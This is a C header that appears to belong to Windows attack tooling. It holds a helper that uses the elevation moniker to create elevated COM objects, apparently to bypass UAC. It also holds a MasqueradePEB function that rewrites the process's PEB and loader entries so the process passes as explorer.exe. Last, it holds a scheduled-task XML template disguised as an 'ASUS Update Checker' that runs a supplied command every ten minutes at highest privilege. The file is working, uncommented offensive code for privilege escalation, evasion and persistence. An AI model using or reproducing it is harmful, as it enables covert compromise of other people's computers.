#pragma once
#include <stdio.h>
#include <Windows.h>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")

#define T_CLSID_VirtualFactoryServer         L"{A6BFEA43-501F-456F-A845-983D3AD7B8F0}"
#define T_CLSID_ElevatedFactoryServer		 L"{804BD226-AF47-4D71-B492-443A57610B08}"
#define T_ELEVATION_MONIKER_ADMIN            L"Elevation:Administrator!new:"

#ifndef UCM_DEFINE_GUID
#define UCM_DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
     EXTERN_C const GUID DECLSPEC_SELECTANY name \
                = { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }  
#endif

UCM_DEFINE_GUID(IID_ElevatedFactoryServer, 0x804BD226, 0xAF47, 0x04D71, 0xB4, 0x92, 0x44, 0x3A, 0x57, 0x61, 0x0B, 0x08);

typedef interface IElevatedFactoryServer IElevatedFactoryServer;

typedef struct IElevatedFactoryServerVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in IElevatedFactoryServer* This,
			__RPC__in REFIID riid,
			_COM_Outptr_ void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in IElevatedFactoryServer* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in IElevatedFactoryServer* This);

	HRESULT(STDMETHODCALLTYPE* ServerCreateElevatedObject)(
		__RPC__in IElevatedFactoryServer* This,
		__RPC__in REFCLSID rclsid,
		__RPC__in REFIID riid,
		_COM_Outptr_ void** ppvObject);

	//incomplete definition

	END_INTERFACE

} *PIElevatedFactoryServerVtbll;

interface IElevatedFactoryServer { CONST_VTBL struct IElevatedFactoryServerVtbl* lpVtbl; };

HRESULT ucmAllocateElevatedObject(
	_In_ LPWSTR lpObjectCLSID,
	_In_ REFIID riid,
	_In_ DWORD dwClassContext,
	_Outptr_ void** ppv
)
{
	BOOL        bCond = FALSE;
	DWORD       classContext;
	HRESULT     hr = E_FAIL;
	PVOID       ElevatedObject = NULL;

	BIND_OPTS3  bop;
	WCHAR       szMoniker[MAX_PATH];

	do {

		if (wcslen(lpObjectCLSID) > 64)
			break;

		RtlSecureZeroMemory(&bop, sizeof(bop));
		bop.cbStruct = sizeof(bop);

		classContext = dwClassContext;
		if (dwClassContext == 0)
			classContext = CLSCTX_LOCAL_SERVER;

		bop.dwClassContext = classContext;

		wcscpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
		wcscat(szMoniker, lpObjectCLSID);

		hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);

	} while (bCond);

	*ppv = ElevatedObject;

	return hr;
}

BOOL MasqueradePEB() {


	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;

	typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef void (WINAPI* _RtlInitUnicodeString)(
		PUNICODE_STRING DestinationString,
		PCWSTR SourceString
		);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY* Flink;
		struct _LIST_ENTRY* Blink;
	} LIST_ENTRY, * PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION
	{
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

	// Partial PEB
	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union
		{
			BOOLEAN BitField;
			struct
			{
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, * PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union
		{
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union
		{
			LIST_ENTRY HashLinks;
			struct
			{
				PVOID SectionPointer;
				ULONG CheckSum;
			};
		};
		union
		{
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		return FALSE;
	}

	_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEnterCriticalSection");
	if (RtlEnterCriticalSection == NULL) {
		return FALSE;
	}

	_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlLeaveCriticalSection");
	if (RtlLeaveCriticalSection == NULL) {
		return FALSE;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		return FALSE;
	}

	// Read Ldr Address into PEB_LDR_DATA Structure
	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
		return FALSE;
	}

	// Let's overwrite UNICODE_STRING structs in memory

	// First set Explorer.exe location buffer
	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

	// Take ownership of PEB
	RtlEnterCriticalSection(peb->FastPebLock);

	// Masquerade ImagePathName and CommandLine 
	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	// Masquerade FullDllName and BaseDllName
	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do
	{
		// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
			return FALSE;
		}

		// Read FullDllName into string
		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
		{
			return FALSE;
		}

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	//Release ownership of PEB
	RtlLeaveCriticalSection(peb->FastPebLock);

	// Release Process Handle
	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
		return FALSE;
	}

	return TRUE;
}

static const wchar_t* xml =
L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
L"<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
L"  <RegistrationInfo>\n"
L"    <Description>ASUS Update Checker 2.0</Description>\n"
L"  </RegistrationInfo>\n"
L"  <Triggers>\n"
L"    <TimeTrigger id=\"Trigger1\">\n"
L"      <Repetition>\n"
L"        <Interval>PT10M</Interval>\n"
L"        <StopAtDurationEnd>false</StopAtDurationEnd>\n"
L"      </Repetition>\n"
L"      <StartBoundary>2005-01-01T12:05:00</StartBoundary>\n"
L"      <Enabled>true</Enabled>\n"
L"    </TimeTrigger>\n"
L"  </Triggers>\n"
L"  <Settings>\n"
L"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
L"    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n"
L"    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
L"    <AllowHardTerminate>true</AllowHardTerminate>\n"
L"    <StartWhenAvailable>false</StartWhenAvailable>\n"
L"    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
L"    <IdleSettings>\n"
L"      <Duration>PT10M</Duration>\n"
L"		<WaitTimeout>PT1H</WaitTimeout>\n"
L"      <StopOnIdleEnd>false</StopOnIdleEnd>\n"
L"      <RestartOnIdle>false</RestartOnIdle>\n"
L"    </IdleSettings>\n"
L"    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
L"    <Enabled>true</Enabled>\n"
L"    <Hidden>false</Hidden>\n"
L"    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
L"    <WakeToRun>false</WakeToRun>\n"
L"    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n"
L"    <Priority>7</Priority>\n"
L"  </Settings>\n"
L"  <Actions Context=\"Author\">\n"
L"    <Exec>\n"
L"      <Command>%s</Command>\n"
L"    </Exec>\n"
L"  </Actions>\n"
L"  <Principals>\n"
L"    <Principal id=\"Author\">\n"
L"      <UserId>%s</UserId>\n"
L"      <LogonType>InteractiveToken</LogonType>\n"
L"      <RunLevel>HighestAvailable</RunLevel>\n"
L"    </Principal>\n"
L"  </Principals>\n"
L"</Task>\n";

